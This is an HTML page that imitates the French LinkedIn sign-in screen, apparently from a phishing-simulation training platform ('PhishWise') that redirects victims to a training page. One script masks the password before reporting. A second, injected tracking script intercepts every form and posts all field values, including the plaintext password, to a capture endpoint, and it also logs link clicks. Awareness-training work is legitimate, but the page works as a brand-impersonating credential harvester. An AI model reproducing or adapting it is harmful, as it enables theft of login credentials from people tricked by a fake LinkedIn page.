<!DOCTYPE html><html lang="fr"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter | LinkedIn</title>
    <style>
        /* Styles généraux pour le corps de la page */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background-color: #f3f2ef; /* Couleur de fond LinkedIn */
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
       }

        /* Conteneur principal du formulaire de connexion */
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 0 1px rgba(0,0,0,0.15), 0 6px 9px rgba(0,0,0,0.20);
            padding: 24px;
            width: 100%;
            max-width: 400px; /* Largeur maximale du conteneur */
            margin: 0 16px; /* Marge latérale pour petits écrans */
        }

        /* Conteneur du logo LinkedIn */
        .linkedin-logo-container {
            margin-bottom: 24px;
            text-align: center; /* Centrer le logo */
        }

        /* Styles pour le logo LinkedIn (appliqué à l'image) */
        .linkedin-full-logo {
            width: 120px; /* Largeur du logo */
            height: auto; /* Maintient les proportions */
            vertical-align: middle; /* Alignement vertical */
        }

        /* Titre de la page de connexion */
        .sign-in-title {
            font-size: 32px;
            font-weight: 400;
            color: rgba(0,0,0,0.9);
            margin-bottom: 8px;
            line-height: 1.25;
        }

        /* Sous-titre */
        .subtitle {
            font-size: 14px;
            color: rgba(0,0,0,0.6);
            margin-bottom: 24px;
      }

        /* Groupe de formulaire (label + input) */
        .form-group {
            margin-bottom: 24px;
        }

        /* Label des champs de formulaire */
        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: rgba(0,0,0,0.9);
            margin-bottom: 4px;
        }

        /* Champs de saisie de formulaire */
        .form-input {
            width: 100%;
            height: 52px;
            padding: 8px 12px;
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 4px;
            font-size: 16px;
            color: rgba(0,0,0,0.9);
            background-color: white;
            transition: border-color 0.15s ease-in-out;
        }

        .form-input:focus {
            outline: none;
            border-color: #0a66c2; /* Couleur de bordure au focus (bleu LinkedIn) */
            border-width: 2px; /* Épaissir la bordure au focus */
            padding: 7px 11px; /* Ajuster le padding pour compenser la bordure */
        }

        .form-input::placeholder {
            color: rgba(0,0,0,0.6);
        }

        /* Bouton de connexion principal */
        .sign-in-button {
            width: 100%;
            height: 52px;
            background-color: #0a66c2; /* Bleu LinkedIn */
            color: white;
            border: none;
            border-radius: 28px; /* Bouton arrondi */
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.15s ease-in-out;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .sign-in-button:hover {
            background-color: #004182; /* Bleu plus foncé au survol */
        }

        .sign-in-button:disabled {
            background-color: rgba(0,0,0,0.08);
            color: rgba(0,0,0,0.4);
            cursor: not-allowed;
        }

        /* Lien mot de passe oublié */
        .forgot-password {
            text-align: center;
            margin-bottom: 24px;
        }

        .forgot-password a {
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        /* Séparateur "ou" */
        .divider {
            position: relative;
            text-align: center;
            margin: 16px 0;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: rgba(0,0,0,0.15);
        }

        .divider span {
            background-color: white;
            padding: 0 16px;
            color: rgba(0,0,0,0.6);
            font-size: 14px;
            position: relative; /* Pour que le texte soit au-dessus de la ligne */
        }

        /* Boutons de connexion tiers (Google, Apple) */
        .google-signin,
        .apple-signin {
            width: 100%;
            height: 52px;
            background-color: white;
            color: rgba(0,0,0,0.6);
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 28px;
            font-size: 16px;
            font-weight: 400;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.15s ease-in-out;
            margin-bottom: 24px;
        }

        .google-signin:hover,
        .apple-signin:hover {
            background-color: rgba(112,181,249,0.15); /* Légère couleur au survol */
            border-color: #0a66c2;
        }

        /* Section "Nouveau sur LinkedIn ?" */
        .join-now {
            text-align: center;
            font-size: 16px;
            color: rgba(0,0,0,0.6);
        }

        .join-now a {
            color: #0a66c2;
            text-decoration: none;
            font-weight: 600;
        }

        .join-now a:hover {
            text-decoration: underline;
        }

        /* Messages d'erreur de validation (initialement cachés) */
        .error-message {
            color: #cc1016;
            font-size: 14px;
            margin-top: 4px;
            display: none; /* Masqué par défaut */
        }

        /* Conteneur de la checkbox */
        .checkbox-container {
            display: flex;
            align-items: flex-start;
            margin-bottom: 24px;
            gap: 8px;
        }

        .checkbox {
            width: 16px;
            height: 16px;
            margin-top: 2px;
        }

        .checkbox-label {
            font-size: 12px;
            color: rgba(0,0,0,0.6);
            line-height: 1.33;
            flex: 1;
        }

        .checkbox-label a {
            color: #0a66c2;
            text-decoration: none;
        }

        .checkbox-label a:hover {
            text-decoration: underline;
        }

        /* Loading spinner */
        .loading-spinner {
            display: none;
            width: 16px;
            height: 16px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            display: none;
        }

        /* Media queries pour la responsivité */
        @media (max-width: 480px) {
            .login-container {
                padding: 16px;
                margin: 0 8px;
            }

            .sign-in-title {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="linkedin-logo-container">
            <!-- Logo LinkedIn chargé depuis un fichier PNG local -->
            <img class="linkedin-full-logo" src="http://localhost:3000/images/logos/linkedin-logo.png" alt="LinkedIn Logo">
        </div>

        <h1 class="sign-in-title">Se connecter</h1>
        <p class="subtitle">Rester en contact et continuer à partager</p>

        <form id="loginForm" action="http://localhost:3000/login" method="POST">
            <div class="form-group">
                <label for="username" class="form-label">E-mail ou téléphone</label>
                <input type="text" id="username" name="username" class="form-input" required="" autocomplete="username">
                <div class="error-message" id="usernameError">Veuillez saisir une adresse e-mail ou un numéro de téléphone valide.</div>
            </div>

            <div class="form-group">
                <label for="password" class="form-label">Mot de passe</label>
                <input type="password" id="password" name="password" class="form-input" required="" autocomplete="current-password">
                <div class="error-message" id="passwordError">Mot de passe incorrect. Réessayez ou <a href="#">cliquez ici pour le réinitialiser</a>.</div>
            </div>

            <div class="checkbox-container">
                <input type="checkbox" id="remember" name="remember" class="checkbox">
                <label for="remember" class="checkbox-label">
                    En cliquant sur Accepter et se connecter, vous acceptez les <a href="#">Conditions d'utilisation</a>, la <a href="#">Politique de confidentialité</a> et la <a href="#">Politique relative aux cookies</a> de LinkedIn.
                </label>
            </div>

            <button type="submit" class="sign-in-button" id="signInBtn" disabled="">
                <div class="loading-spinner" id="loadingSpinner"></div>
                <span id="buttonText">Se connecter</span>
                <span class="loading-text" id="loadingText">Connexion...</span>
            </button>
        </form>

        <div class="forgot-password">
            <a href="#">Mot de passe oublié ?</a>
        </div>

        <div class="divider">
            <span>ou</span>
        </div>

        <button type="button" class="google-signin">
            <svg width="20" height="20" viewBox="0 0 24 24">
                <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
                <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
                <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
                <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>
            </svg>
            Continuer avec Google
        </button>

        <button type="button" class="apple-signin">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"></path>
            </svg>
            Continuer avec Apple
        </button>

        <div class="join-now">
            Nouveau sur LinkedIn ? <a href="#">S'inscrire maintenant</a>
        </div>
    </div>

    <script>
        // Récupération des données de phishing (similaire aux autres pages)
        function getPhishingData() {
            const urlParams = new URLSearchParams(window.location.search);
            const pathParts = window.location.pathname.split('/');
            
            // Campaign ID depuis le path /phishing/CAMPAIGN_ID
            const campaignId = pathParts[2];
            
            // Email depuis plusieurs sources possibles
            let targetEmail = null;
            
            // Source 1: Paramètres URL
            if (urlParams.get('email')) {
                targetEmail = urlParams.get('email');
                console.log('📧 Email trouvé dans URL params:', targetEmail);
            }
            
            // Source 2: Session de phishing injectée
            if (!targetEmail && window.PHISHING_SESSION && window.PHISHING_SESSION.targetEmail) {
                targetEmail = window.PHISHING_SESSION.targetEmail;
                console.log('📧 Email trouvé dans session phishing:', targetEmail);
            }
            
            // Source 3: Token dans session
            const token = urlParams.get('token') || (window.PHISHING_SESSION && window.PHISHING_SESSION.token);
            
            console.log('📊 Données extraites:', { campaignId, targetEmail, token });
            
            return { campaignId, targetEmail, token };
        }

        const form = document.getElementById('loginForm');
        const signInBtn = document.getElementById('signInBtn');
        const buttonText = document.getElementById('buttonText');
        const loadingText = document.getElementById('loadingText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        // Validation en temps réel
        function validateForm() {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            signInBtn.disabled = !username || !password;
        }

        usernameInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);

        // Gestion de la soumission du formulaire avec redirection
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const { campaignId, targetEmail, token } = getPhishingData();
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            if (!username || !password) {
                return;
            }

            // VALIDATION CRITIQUE
            if (!campaignId) {
                console.error('❌ ERREUR: Campaign ID manquant'); 
                return;
            }

            if (!targetEmail) {
                console.error('❌ ERREUR: Email cible manquant'); 
                return;
            }

            console.log('🎯 Soumission LinkedIn avec:', { campaignId, targetEmail, username: username.substring(0, 3) + '***' });

            // Animation de chargement
            signInBtn.disabled = true;
            buttonText.style.display = 'none';
            loadingText.style.display = 'inline';
            loadingSpinner.style.display = 'inline-block';

            // Données de phishing
            const phishingData = {
                campaignId: campaignId,
                targetEmail: targetEmail,
                timestamp: new Date().toISOString(),
                triggerType: 'linkedin_form_submission',
                formData: {
                    username: username,
                    password: '***HIDDEN***'
                },
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer,
                token: token || 'direct-access'
            };

            // URL de capture
            const captureUrl = `/api/phishing/${campaignId}/capture`;
            console.log('📊 Envoi vers:', captureUrl);

            fetch(captureUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(phishingData)
            })
            .then(response => {
                console.log('📊 Status capture:', response.status);
                if (!response.ok) {
                    throw new Error(`Erreur HTTP: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                console.log('✅ Capture réussie:', data);
                
                // URL de redirection robuste
                let trainingUrl;
                if (data.redirectUrl) {
                    trainingUrl = data.redirectUrl;
                } else {
                    trainingUrl = `/training/${campaignId}?email=${encodeURIComponent(targetEmail)}`;
                    if (token) {
                        trainingUrl += `&token=${token}`;
                    }
                }
                
                console.log('🔄 Redirection vers:', trainingUrl);
                
                setTimeout(() => {
                    window.location.href = trainingUrl;
                }, 1500);
            })
            .catch(error => {
                console.warn('⚠️ Erreur capture:', error);
                
                // Redirection de secours même en cas d'erreur
                let fallbackUrl = `/training/${campaignId}?email=${encodeURIComponent(targetEmail)}`;
                if (token) {
                    fallbackUrl += `&token=${token}`;
                }
                
                console.log('🔄 Redirection de secours vers:', fallbackUrl);
                
                setTimeout(() => {
                    window.location.href = fallbackUrl;
                }, 1500);
            });
        });

        // Masquer les erreurs quand l'utilisateur commence à taper
        usernameInput.addEventListener('input', function() {
            document.getElementById('usernameError').style.display = 'none';
            this.style.borderColor = 'rgba(0,0,0,0.6)';
        });

        passwordInput.addEventListener('input', function() {
            document.getElementById('passwordError').style.display = 'none';
            this.style.borderColor = 'rgba(0,0,0,0.6)';
        });

        // Validation à l'initialisation
        document.addEventListener('DOMContentLoaded', function() {
            const { campaignId, targetEmail, token } = getPhishingData();
            
            console.log('🏁 Page LinkedIn initialisée');
            console.log('🏷️ Campaign:', campaignId);
            console.log('📧 Email:', targetEmail);
            console.log('🎫 Token:', token);
            console.log('🌐 URL:', window.location.href);
            
            if (!campaignId) {
                console.error('❌ Campaign ID manquant à l\'initialisation'); 
                return;
            }
            
            validateForm();
        });

        // Debug global
        window.debugPhishingPage = function() {
            const data = getPhishingData();
            console.table(data);
            console.log('Session:', window.PHISHING_SESSION);
            console.log('URL complète:', window.location.href);
            return data;
        };

        console.log('✅ Script LinkedIn avec redirection chargé');
    </script>


    <script>
      (function() {
        // Custom alert function to replace native alert()
        window.customAlert = function(message) {
          console.log('Custom Alert:', message);
          // You can implement a more sophisticated modal/message box here if needed.
          // For now, it just logs to console.
          // Example: alert(message); // If you still want the native alert for simulation
        };

        console.log('🎯 PhishWise Universal Tracking activated');

        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initTracking);
        } else {
          initTracking();
        }

        function initTracking() {
          // Intercept all forms
          const forms = document.querySelectorAll('form');
          console.log('📝 Forms detected:', forms.length);

          forms.forEach(function(form, index) {
            form.addEventListener('submit', function(e) {
              e.preventDefault();
              console.log('📋 Form submission intercepted:', index);

              // Collect all form data
              const formData = new FormData(form);
              const data = {};

              // Extract data from inputs
              for (let [key, value] of formData.entries()) {
                data[key] = value;
              }

              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
              const inputs = form.querySelectorAll('input, select, textarea');
              inputs.forEach(function(input) {
                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
                  if (input.type === 'checkbox' || input.type === 'radio') {
                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
                  } else {
                    data[input.name] = input.value;
                  }
                }
              });

              // Tracking metadata
              data._campaignId = '68ae397867d3cb55148e80c3';
              data._timestamp = new Date().toISOString();
              data._userAgent = navigator.userAgent;
              data._referrer = document.referrer;
              data._url = window.location.href;
              data._formIndex = index;
              data._formAction = form.action || 'N/A';
              data._formMethod = form.method || 'GET';

              console.log('📊 Collected data:', data);

              // Send data
              fetch('http://localhost:3000/api/phishing/capture', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
              }).then(function(response) {
                console.log('✅ Data sent successfully');
                // Redirect to learning page
                window.location.href = 'http://localhost:3000/learning/68ae397867d3cb55148e80c3';
              }).catch(function(error) {
                console.error('❌ Error sending data:', error);
                // Redirect even on error
                setTimeout(function() {
                  window.location.href = 'http://localhost:3000/learning/68ae397867d3cb55148e80c3';
                }, 1000);
              });
            });
          });

          // Track link clicks
          document.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (link) {
              const href = link.href;
              console.log('🔗 Link clicked:', href);

              // Send click event
              fetch('http://localhost:3000/api/phishing/track-click', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  campaignId: '68ae397867d3cb55148e80c3',
                  clickedUrl: href,
                  linkText: link.textContent.trim(),
                  timestamp: new Date().toISOString(),
                  userAgent: navigator.userAgent
                })
              }).catch(console.error);
            }
          });

          // Track input field interactions (focus)
          const inputs = document.querySelectorAll('input, textarea, select');
          inputs.forEach(function(input) {
            input.addEventListener('focus', function() {
              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
            });
          });

          console.log('🚀 Universal tracking initialized');
        }
      })();
    </script>
</body></html>
